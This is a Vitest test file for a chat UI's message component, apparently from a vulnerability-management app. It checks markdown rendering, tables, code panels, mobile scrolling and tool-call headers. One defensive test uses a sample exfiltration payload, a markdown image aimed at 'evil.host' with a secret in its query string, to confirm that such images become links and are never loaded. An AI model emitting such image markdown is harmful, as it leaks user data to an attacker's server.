import { render, screen } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { describe, it, expect } from 'vitest';

import { ChatMessage, StreamingMessage } from '../ChatMessage';

function renderMessage(role: 'user' | 'assistant', content: string) {
  return render(
    <MemoryRouter>
      <ChatMessage
        message={{
          id: 'm1',
          conversation_id: 'c1',
          role,
          content,
          tool_calls: [],
          created_at: '2026-10-05T00:00:00Z',
        }}
      />
    </MemoryRouter>,
  );
}

const renderAssistant = (content: string) => renderMessage('assistant', content);

describe('ChatMessage markdown', () => {
  it('renders a markdown image as a link instead of loading it', () => {
    const { container } = renderAssistant('![leak](https://evil.host/p.png?d=secret)');

    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'leak' });
    expect(link).toHaveAttribute('href', 'https://evil.host/p.png?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('opens a protocol-relative //host link as an external link', () => {
    renderAssistant('[docs](//evil.host/x)');

    const link = screen.getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noreferrer noopener');
  });

  it('keeps a single-slash path as an in-app link', () => {
    renderAssistant('[project](/projects/p1)');

    const link = screen.getByRole('link', { name: 'project' });
    expect(link).toHaveAttribute('href', '/projects/p1');
    expect(link).not.toHaveAttribute('target');
  });
});

describe('ChatMessage typography', () => {
  it('sets fenced code in a panel like a tool call, inline code as a chip, and lists with their markers', () => {
    renderAssistant('Run `npm-ci`:\n\n```bash\nnpm run build\n```\n\n- one\n- two\n\n1. first\n2. second');

    expect(screen.getByText('npm-ci')).toHaveClass('rounded', 'bg-muted', 'font-mono');
    expect(screen.getByText('npm run build').closest('pre')).toHaveClass('rounded-md', 'border', 'bg-muted/20', 'text-xs');
    expect(screen.getByText('one').closest('ul')).toHaveClass('list-disc', 'pl-5');
    expect(screen.getByText('first').closest('ol')).toHaveClass('list-decimal', 'pl-5');
    expect(screen.getByText('npm-ci').closest('p')).toHaveClass('my-1');
  });

  it("keeps a table in the user's bubble in the bubble's colour, without the muted header or the row hover", () => {
    renderMessage('user', '| Project | Fix |\n|---|---|\n| checkout-service | 2.17.1 |');

    expect(screen.getByRole('columnheader', { name: 'Project' })).toHaveClass('text-inherit');
    expect(screen.getByRole('columnheader', { name: 'Project' })).not.toHaveClass('text-muted-foreground');
    expect(screen.getByRole('cell', { name: 'checkout-service' }).closest('tr')).toHaveClass('hover:bg-transparent');
  });

  it("writes a link in the user's bubble in the bubble's colour, underlined, instead of the primary colour of its fill", () => {
    renderMessage('user', 'See https://example.com/docs');

    expect(screen.getByRole('link').closest('.break-words')).toHaveClass('[&_a]:text-inherit', '[&_a]:underline');
  });

  it("underlines an answer's links, in-app and external, so they stand apart from the text around them", () => {
    renderAssistant('See [project](/projects/p1) and [docs](https://example.com/docs).');

    expect(screen.getByRole('link', { name: 'project' })).toHaveClass('underline');
    expect(screen.getByRole('link', { name: 'docs' })).toHaveClass('underline');
  });

  it('sets a quote off from the answer with a rule and italics', () => {
    renderAssistant('The advisory says:\n\n> Upgrade to 2.17.1 or later.');

    expect(screen.getByText('Upgrade to 2.17.1 or later.').closest('blockquote')).toHaveClass('border-l-4', 'pl-4', 'italic');
  });

  it("sets an answer's headings apart from its text, like the headings of an advisory or a SAST rule", () => {
    renderAssistant('### Impact\n\nUpgrade to 2.17.1.');

    expect(screen.getByRole('heading', { level: 3, name: 'Impact' })).toHaveClass('font-semibold');
    expect(screen.getByText('Upgrade to 2.17.1.')).not.toHaveClass('font-semibold');
  });

  it("keeps an assistant table's muted header", () => {
    renderAssistant('| Project | Fix |\n|---|---|\n| checkout-service | 2.17.1 |');

    expect(screen.getByRole('columnheader', { name: 'Project' })).toHaveClass('text-muted-foreground');
  });
});

describe('ChatMessage on a phone', () => {
  it('scrolls a wide markdown table in its own wrapper and wraps a long command inside the message', () => {
    renderAssistant('| Project | Fix |\n|---|---|\n| checkout-service | 2.17.1 |\n\nRun `mvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core`');

    expect(screen.getByRole('table').parentElement).toHaveClass('overflow-auto');
    const body = screen.getByRole('table').closest('.break-words');
    expect(body?.parentElement).toHaveClass('min-w-0');
  });

  it('scrolls a fenced command sideways inside the message instead of running past it', () => {
    const command = 'mvn versions:use-dep-version -Dincludes=org.apache.logging.log4j:log4j-core -DdepVersion=2.17.1 -DforceVersion=true';
    renderAssistant(`Run:\n\n\`\`\`bash\n${command}\n\`\`\``);

    expect(screen.getByText(command).closest('pre')).toHaveClass('overflow-x-auto');
  });

  it("keeps a streaming answer's table, and so its sideways scroll, when the next chunk arrives", () => {
    const table = '| Project | Fix |\n|---|---|\n| checkout-service | 2.17.1 |\n\n';
    const stream = (content: string) => (
      <MemoryRouter>
        <StreamingMessage content={content} toolCalls={[]} activeToolCall={null} />
      </MemoryRouter>
    );
    const { rerender } = render(stream(`${table}Upgrade`));
    const shown = screen.getByRole('table');

    rerender(stream(`${table}Upgrade log4j-core first.`));

    expect(screen.getByRole('table')).toBe(shown);
  });

  it("lays a markdown table out with the app's table cells, keeping a column's alignment", () => {
    renderAssistant('| Project | Fix |\n|---|---:|\n| checkout-service | 2.17.1 |');

    expect(screen.getByRole('columnheader', { name: 'Project' })).toHaveClass('px-4');
    expect(screen.getByRole('cell', { name: 'checkout-service' })).toHaveClass('p-4');
    expect(screen.getByRole('cell', { name: '2.17.1' })).toHaveStyle({ textAlign: 'right' });
  });

  it("truncates a long tool name in its call's header and names it in full as the title", () => {
    render(
      <MemoryRouter>
        <ChatMessage
          message={{
            id: 'm2',
            conversation_id: 'c1',
            role: 'assistant',
            content: 'Done.',
            tool_calls: [{ tool_name: 'get_findings_by_cve_and_project_branch', arguments: {}, result: {} }],
            created_at: '2026-10-05T00:00:00Z',
          }}
        />
      </MemoryRouter>,
    );

    const name = screen.getByText('get_findings_by_cve_and_project_branch');
    expect(name).toHaveClass('min-w-0', 'truncate');
    expect(name).toHaveAttribute('title', 'get_findings_by_cve_and_project_branch');
  });
});
